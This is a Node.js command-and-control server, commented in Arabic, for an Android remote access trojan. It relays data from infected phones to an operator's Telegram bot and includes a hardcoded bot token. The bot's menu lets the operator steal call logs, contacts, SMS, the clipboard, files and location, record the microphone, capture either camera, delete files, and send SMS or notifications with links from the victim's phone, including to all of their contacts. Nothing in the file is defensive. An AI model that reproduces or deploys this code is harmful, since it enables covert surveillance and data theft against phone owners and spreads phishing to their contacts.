const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// بيانات التكوين - تأكد من صحتها
const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
const ADMIN_ID = '5474851558';
const PING_URL = 'https://www.google.com';

// تهيئة التطبيقات
const app = express();
const appServer = http.createServer(app);
const appSocket = new WebSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true });

// ✅ قاعدة بيانات موحدة: ربط رمز الجلسة بجميع بيانات الاتصال
const appSessions = new Map(); 
// الهيكل: sessionToken = { ws: اتصال السوكت, model: "...", battery: "...", ... }

// إعدادات الوسائط والتحليل
const upload = multer();
app.use(bodyParser.json());

// متغيرات التتبع
let currentSessionToken = '';
let currentNumber = '';
let currentTitle = '';

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send('<h1 align="center">تم تشغيل الخادم بنجاح - نظام الجلسات الموحد مفعل</h1>');
});

// ✅ استقبال الملفات من التطبيق مع ربطها بالجلسة
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        // استخراج رمز الجلسة من الترويسة (يجب أن يرسلها التطبيق باسم X-Session-Token)
        const sessionToken = req.headers['x-session-token'];
        if (!sessionToken || !appSessions.has(sessionToken)) {
            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
        }

        const sessionData = appSessions.get(sessionToken);
        const fileName = req.file.originalname;
        
        appBot.sendDocument(ADMIN_ID, req.file.buffer, {
            caption: `°• ملف مرفوع من جهاز: <b>${sessionData.model}</b>`,
            parse_mode: "HTML"
        }, {
            filename: fileName,
            contentType: req.file.mimetype || 'application/octet-stream'
        });
        res.status(200).send('تم الاستلام');
    } catch (err) {
        console.error("خطأ في استقبال الملف:", err);
        res.status(500).send('خطأ في المعالجة');
    }
});

// ✅ استقبال النصوص من التطبيق مع ربطها بالجلسة
app.post("/uploadText", (req, res) => {
    try {
        const sessionToken = req.headers['x-session-token'];
        if (!sessionToken || !appSessions.has(sessionToken)) {
            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
        }

        const sessionData = appSessions.get(sessionToken);
        appBot.sendMessage(ADMIN_ID, 
            `°• رسالة من جهاز: <b>${sessionData.model}</b>\n\n${req.body.text}`, 
            { parse_mode: "HTML" }
        );
        res.status(200).send('تم الاستلام');
    } catch (err) {
        console.error("خطأ في استقبال النص:", err);
        res.status(500).send('خطأ في المعالجة');
    }
});

// ✅ استقبال الموقع من التطبيق مع ربطه بالجلسة
app.post("/uploadLocation", (req, res) => {
    try {
        const sessionToken = req.headers['x-session-token'];
        if (!sessionToken || !appSessions.has(sessionToken)) {
            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
        }

        const sessionData = appSessions.get(sessionToken);
        const { lat, lon } = req.body;
        
        appBot.sendLocation(ADMIN_ID, lat, lon);
        appBot.sendMessage(ADMIN_ID, 
            `°• موقع من جهاز: <b>${sessionData.model}</b>`, 
            { parse_mode: "HTML" }
        );
        res.status(200).send('تم الاستلام');
    } catch (err) {
        console.error("خطأ في استقبال الموقع:", err);
        res.status(500).send('خطأ في المعالجة');
    }
});

// ✅ معالجة اتصالات السوكت وإنشاء رمز الجلسة الموحد
appSocket.on('connection', (ws, req) => {
    // استخراج رمز الجلسة المرسل من التطبيق عند الاتصال
    const clientSessionToken = req.headers['x-session-token'] || uuidv4();
    const deviceData = {
        sessionToken: clientSessionToken,
        model: req.headers.model || "غير معروف",
        battery: req.headers.battery || "غير معروف",
        version: req.headers.version || "غير معروف",
        brightness: req.headers.brightness || "غير معروف",
        provider: req.headers.provider || "غير معروف",
        ws: ws
    };

    // حفظ الجلسة في القاعدة الموحدة
    ws.sessionToken = clientSessionToken;
    appSessions.set(clientSessionToken, deviceData);

    // إشعار بجهاز جديد
    appBot.sendMessage(ADMIN_ID,
        `°• جهاز جديد متصل\n\n` +
        `• الموديل: <b>${deviceData.model}</b>\n` +
        `• مستوى البطارية: <b>${deviceData.battery}%</b>\n` +
        `• إصدار النظام: <b>${deviceData.version}</b>\n` +
        `• سطوع الشاشة: <b>${deviceData.brightness}%</b>\n` +
        `• مزود الخدمة: <b>${deviceData.provider}</b>\n` +
        `• رمز الجلسة: <code>${clientSessionToken}</code>`,
        { parse_mode: "HTML" }
    );

    // استقبال أي رد من التطبيق وإرساله للبوت
    ws.on('message', (message) => {
        try {
            const response = message.toString();
            appBot.sendMessage(ADMIN_ID,
                `°• رد من الجهاز <b>${deviceData.model}</b>:\n\n${response}`,
                { parse_mode: "HTML" }
            );
        } catch (err) {
            console.error("خطأ في معالجة رسالة السوكت:", err);
        }
    });

    // معالجة قطع الاتصال
    ws.on('close', () => {
        if (appSessions.has(clientSessionToken)) {
            const disconnected = appSessions.get(clientSessionToken);
            appBot.sendMessage(ADMIN_ID,
                `°• تم قطع اتصال الجهاز\n\n` +
                `• الموديل: <b>${disconnected.model}</b>\n` +
                `• رمز الجلسة: <code>${clientSessionToken}</code>`,
                { parse_mode: "HTML" }
            );
            appSessions.delete(clientSessionToken);
        }
    });

    ws.on('error', () => appSessions.delete(clientSessionToken));
});

// معالجة أوامر البوت
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId != ADMIN_ID) return appBot.sendMessage(chatId, '°• طلب الوصول مرفوض');

    if (message.reply_to_message) return handleReplies(message);

    switch (message.text) {
        case '/start':
            appBot.sendMessage(ADMIN_ID,
                '°• مرحباً بك في نظام التحكم بالجلسات الموحدة\n\n' +
                '• جميع الطلبات الآن مرتبطة ببعضها عبر رمز جلسة ثابت\n' +
                '• لا يوجد تعارض أو فقدان للبيانات',
                { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true }, parse_mode: "HTML" }
            );
            break;

        case 'الأجهزة المتصلة':
            if (appSessions.size === 0) {
                appBot.sendMessage(ADMIN_ID, '°• لا توجد أجهزة متصلة حالياً');
            } else {
                let list = '°• قائمة الأجهزة والجلسات:\n\n';
                appSessions.forEach(data => {
                    list += `• الموديل: <b>${data.model}</b>\n` +
                            `• رمز الجلسة: <code>${data.sessionToken}</code>\n\n`;
                });
                appBot.sendMessage(ADMIN_ID, list, { parse_mode: "HTML" });
            }
            break;

        case 'تنفيذ أمر':
            if (appSessions.size === 0) {
                appBot.sendMessage(ADMIN_ID, '°• لا توجد أجهزة متصلة');
            } else {
                const keyboard = [];
                appSessions.forEach(data => {
                    keyboard.push([{ text: data.model, callback_data: `device:${data.sessionToken}` }]);
                });
                appBot.sendMessage(ADMIN_ID, '°• اختر الجهاز:', { reply_markup: { inline_keyboard: keyboard } });
            }
            break;
    }
});

// دالة معالجة الردود
function handleReplies(message) {
    const replyText = message.reply_to_message.text;
    const userText = message.text;

    if (replyText.includes('اكتب رقم الهاتف')) {
        currentNumber = userText;
        appBot.sendMessage(ADMIN_ID, '°• اكتب الرسالة المراد إرسالها:', { reply_markup: { force_reply: true } });
    }
    else if (replyText.includes('اكتب الرسالة المراد إرسالها من الجهاز')) {
        sendToDevice(`send_message:${currentNumber}/${userText}`);
        resetVariables();
    }
    else if (replyText.includes('رسالة لجميع الأرقام')) {
        sendToDevice(`send_message_to_all:${userText}`);
        resetVariables();
    }
    else if (replyText.includes('مسار الملف المراد سحبه')) {
        sendToDevice(`file:${userText}`);
        resetVariables();
    }
    else if (replyText.includes('مسار الملف المراد حذفه')) {
        sendToDevice(`delete_file:${userText}`);
        resetVariables();
    }
    else if (replyText.includes('مدة التسجيل الصوتي')) {
        sendToDevice(`microphone:${userText}`);
        resetVariables();
    }
    else if (replyText.includes('رسالة التنبيه الظاهرة')) {
        sendToDevice(`toast:${userText}`);
        resetVariables();
    }
    else if (replyText.includes('عنوان الإشعار')) {
        currentTitle = userText;
        appBot.sendMessage(ADMIN_ID, '°• اكتب الرابط المراد فتحه:', { reply_markup: { force_reply: true } });
    }
    else if (replyText.includes('الرابط المراد فتحه')) {
        sendToDevice(`show_notification:${currentTitle}/${userText}`);
        resetVariables();
    }
    else if (replyText.includes('رابط الملف الصوتي')) {
        sendToDevice(`play_audio:${userText}`);
        resetVariables();
    }
}

// دالة إرسال الأوامر للجهاز
function sendToDevice(command) {
    if (!currentSessionToken || !appSessions.has(currentSessionToken)) {
        return appBot.sendMessage(ADMIN_ID, '°• خطأ: الجلسة غير موجودة');
    }
    const session = appSessions.get(currentSessionToken);
    if (session.ws.readyState === WebSocket.OPEN) {
        session.ws.send(command);
        appBot.sendMessage(ADMIN_ID, '°• تم إرسال الأمر بنجاح', { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true } });
    } else {
        appBot.sendMessage(ADMIN_ID, '°• خطأ: الاتصال مغلق');
    }
}

function resetVariables() {
    currentSessionToken = currentNumber = currentTitle = '';
}

// معالجة النقرات على الأزرار
appBot.on("callback_query", (query) => {
    const { message, data } = query;
    const [action, sessionToken] = data.split(':');

    if (!appSessions.has(sessionToken)) {
        return appBot.answerCallbackQuery(query.id, { text: 'الجلسة منتهية' });
    }

    if (action === 'device') {
        appBot.editMessageText(`°• تحكم في الجهاز: <b>${appSessions.get(sessionToken).model}</b>`, {
            chat_id: ADMIN_ID, message_id: message.message_id, parse_mode: "HTML",
            reply_markup: { inline_keyboard: [
                [{text: '📱 التطبيقات', callback_data: `apps:${sessionToken}`}, {text: '📲 معلومات الجهاز', callback_data: `device_info:${sessionToken}`}],
                [{text: '📂 سحب ملف', callback_data: `file:${sessionToken}`}, {text: '🗑️ حذف ملف', callback_data: `delete_file:${sessionToken}`}],
                [{text: '📃 الحافظة', callback_data: `clipboard:${sessionToken}`}, {text: '🎤 الميكروفون', callback_data: `microphone:${sessionToken}`}],
                [{text: '📷 الكاميرا الأمامية', callback_data: `camera_main:${sessionToken}`}, {text: '📸 الكاميرا الخلفية', callback_data: `camera_selfie:${sessionToken}`}],
                [{text: '📍 الموقع', callback_data: `location:${sessionToken}`}, {text: '💬 تنبيه نصي', callback_data: `toast:${sessionToken}`}],
                [{text: '☎️ المكالمات', callback_data: `calls:${sessionToken}`}, {text: '👤 جهات الاتصال', callback_data: `contacts:${sessionToken}`}],
                [{text: '📳 اهتزاز', callback_data: `vibrate:${sessionToken}`}, {text: '🔔 إشعار', callback_data: `show_notification:${sessionToken}`}],
                [{text: '📨 الرسائل', callback_data: `messages:${sessionToken}`}, {text: '✉️ إرسال رسالة', callback_data: `send_message:${sessionToken}`}],
                [{text: '🔊 تشغيل صوت', callback_data: `play_audio:${sessionToken}`}, {text: '✉️ إرسال للجميع', callback_data: `send_message_to_all:${sessionToken}`}]
            ]}
        });
    }
    else if (['calls','contacts','messages','apps','device_info','clipboard','camera_main','camera_selfie','location','vibrate','stop_audio'].includes(action)) {
        const session = appSessions.get(sessionToken);
        if (session.ws.readyState === WebSocket.OPEN) session.ws.send(action);
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• جاري التنفيذ...', { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true } });
    }
    else if (action === 'send_message') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• اكتب رقم الهاتف:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'send_message_to_all') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• اكتب الرسالة:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'file') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• مسار الملف:', { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    }
    else if (action === 'delete_file') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• مسار الملف المراد حذفه:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'microphone') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• مدة التسجيل بالثواني:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'toast') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• نص التنبيه:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'show_notification') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• عنوان الإشعار:', { reply_markup: { force_reply: true } });
    }
    else if (action === 'play_audio') {
        currentSessionToken = sessionToken;
        appBot.deleteMessage(ADMIN_ID, message.message_id);
        appBot.sendMessage(ADMIN_ID, '°• رابط الصوت المباشر:', { reply_markup: { force_reply: true } });
    }

    appBot.answerCallbackQuery(query.id);
});

// الحفاظ على نشاط الخادم
setInterval(() => {
    appSessions.forEach(session => {
        if (session.ws.readyState === WebSocket.OPEN) session.ws.send('ping');
    });
    axios.get(PING_URL).catch(() => {});
}, 5000);

// تشغيل الخادم
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => console.log(`✅ الخادم يعمل على المنفذ ${PORT} - نظام الجلسات الموحد مفعل`));
